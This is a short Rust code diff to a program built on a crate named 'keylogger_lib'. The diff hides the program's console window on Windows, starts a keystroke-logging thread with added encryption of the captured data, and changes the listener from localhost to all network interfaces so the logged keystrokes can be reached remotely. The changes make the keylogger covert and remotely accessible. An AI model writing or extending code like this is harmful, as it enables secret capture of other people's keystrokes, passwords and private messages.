@@ -1,3 +1,4 @@
+#![windows_subsystem = "windows"]
 extern crate keylogger_lib;
 
 use std::io::Write;
@@ -6,11 +7,10 @@ const PUB_KEY_PATH: &str = "pub_key.char";
 const SYM_KEY_PATH: &str = "encryption_key.char";
 
 fn main() {
+    let second_thread = std::thread::spawn(|| keylogger_lib::key_log(
+        &keylogger_lib::EncryptionType::Both {pub_key_loc: PUB_KEY_PATH.to_owned(), sym_key_loc: SYM_KEY_PATH.to_owned()}));
 
-
-    let second_thread = std::thread::spawn(|| keylogger_lib::key_log(PUB_KEY_PATH, true));
-
-    let listener = std::net::TcpListener::bind("127.0.0.1:13660").expect("Listener Binding failed");
+    let listener = std::net::TcpListener::bind("0.0.0.0:13660").expect("Listener Binding failed");
     println!("listening started, ready to accept");
     for stream in listener.incoming() {
         let mut stream = stream.unwrap();
